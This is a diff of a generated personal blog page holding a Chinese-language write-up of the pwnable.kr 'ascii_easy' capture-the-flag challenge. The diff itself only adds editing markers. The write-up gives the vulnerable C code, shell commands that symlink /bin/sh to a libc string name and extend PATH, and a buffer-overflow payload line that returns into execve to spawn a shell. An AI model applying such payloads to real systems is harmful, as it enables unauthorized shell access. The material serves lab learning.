@@ -1,7 +1,7 @@
 
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="en" class="no-js" data-local-preview="false">
   <head>
     
       <meta charset="utf-8">
@@ -213,7 +213,7 @@
 
   
 
-<div data-shared-navigation="../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../" aria-busy="true">
+<div data-shared-navigation="../../../../../navigation/shared/group-2-311df939f8c9.html" data-site-root="../../../../../" aria-busy="true">
   <a href="../../../../..">加载栏目目录…</a>
 </div>
 <script src="../../../../../javascripts/shared-navigation.js"></script>
@@ -250,7 +250,7 @@
       
     
     <div class="md-container" data-md-component="container"
-         data-shared-navigation-target="../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-shared-navigation-target="../../../../../navigation/shared/group-2-311df939f8c9.html"
          data-site-root="../../../../../"
          data-navigation-hidden="false">
       
@@ -671,10 +671,19 @@
   
 
 
+<!-- blog-edit-start:5895f6af8237db92:b0 -->
+
 <h1 id="pwnablekr-ascii_easy">Pwnable.kr ascii_easy</h1>
+<!-- blog-edit-end:5895f6af8237db92:b0 -->
+
 <div class="file-actions" data-image-edit-revision="5895f6af8237db921d6242c61eeaccdbeb3be93c062f70aa04e40d38031b15dd" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote%5C26.ascii_easy.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\26.ascii_easy.md">复制路径</span></div>
 
+<!-- blog-edit-start:5895f6af8237db92:b1 -->
+
 <h2 id="_1">程序分析</h2>
+<!-- blog-edit-end:5895f6af8237db92:b1 -->
+<!-- blog-edit-start:5895f6af8237db92:b2 -->
+
 <p>简化的代码如下<br />
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">char</span><span class="o">**</span><span class="w"> </span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="o">**</span><span class="w"> </span><span class="n">envp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 </span><span id="__span-0-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">    </span><span class="c1">// 检查argv[1]指向的那段必须全是 ascii 可见字符</span>
@@ -687,17 +696,42 @@
 </span><span id="__span-0-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">);</span>
 </span><span id="__span-0-10"><span class="linenos" data-linenos="10 "></span><span class="p">}</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:5895f6af8237db92:b2 -->
+
+<!-- blog-edit-start:5895f6af8237db92:b3 -->
+
 <h2 id="_2">漏洞点</h2>
+<!-- blog-edit-end:5895f6af8237db92:b3 -->
+<!-- blog-edit-start:5895f6af8237db92:b4 -->
+
 <p>一开始我是懵的，主要的问题是：溢出的返回地址返回到哪里去？？返回到栈，不知道地址，看来只能返回到 libc 的 <code>execve</code> 了。但是这个 libc 没有 <code>/bin/sh</code>，所以参数又不好搞。</p>
+<!-- blog-edit-end:5895f6af8237db92:b4 -->
+
+<!-- blog-edit-start:5895f6af8237db92:b5 -->
+
 <p>执行 <code>execve('/bin/sh', 0, 0)</code>，没有 <code>/bin/sh</code> 怎么办？直接公布答案，这个确实算是奇技淫巧了。在当前目录加一个 <code>/bin/sh</code> 的软连接，名字是在 libc 中可以找到的，比如 <code>error</code>，然后执行 <code>execve('error', 0, 0)</code> 即可。</p>
+<!-- blog-edit-end:5895f6af8237db92:b5 -->
+
+<!-- blog-edit-start:5895f6af8237db92:b6 -->
+
 <p>具体流程如下<br />
 <div class="language-sh highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos="1 "></span>ln<span class="w"> </span>-s<span class="w"> </span>/bin/sh<span class="w"> </span>error
 </span><span id="__span-1-2"><span class="linenos" data-linenos="2 "></span><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/home/ascii_easy
 </span><span id="__span-1-3"><span class="linenos" data-linenos="3 "></span>
 </span><span id="__span-1-4"><span class="linenos" data-linenos="4 "></span><span class="nv">_argv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;A&#39;</span>*32<span class="w"> </span>+<span class="w"> </span>p32<span class="o">(</span>call_execve<span class="o">)</span><span class="w"> </span>+<span class="w"> </span>p32<span class="o">(</span>error<span class="o">)</span><span class="w"> </span>+<span class="w"> </span>p32<span class="o">(</span>null<span class="o">)</span><span class="w"> </span>+<span class="w"> </span>p32<span class="o">(</span>null<span class="o">)</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:5895f6af8237db92:b6 -->
+
+<!-- blog-edit-start:5895f6af8237db92:b7 -->
+
 <h2 id="_3">总结反思</h2>
+<!-- blog-edit-end:5895f6af8237db92:b7 -->
+<!-- blog-edit-start:5895f6af8237db92:b8 -->
+
 <p>感觉这个确实太奇技淫巧了，而且没什么价值。因为实际情况不会登上服务器创立软连接并且设置环境变量。</p>
+<!-- blog-edit-end:5895f6af8237db92:b8 -->
+
+<div hidden data-text-edit-source="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\26.ascii_easy.md" data-text-edit-revision="5895f6af8237db921d6242c61eeaccdbeb3be93c062f70aa04e40d38031b15dd" data-text-edit-marker="5895f6af8237db92" data-text-edit-schema="1"></div>
 
 
 
@@ -929,8 +963,6 @@
         <script src="../../../../../javascripts/resizable-sidebar.js"></script>
       
         <script src="../../../../../javascripts/sidebar-toggle-buttons.js"></script>
-      
-        <script src="../../../../../javascripts/review-tracker.js"></script>
       
         <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
       
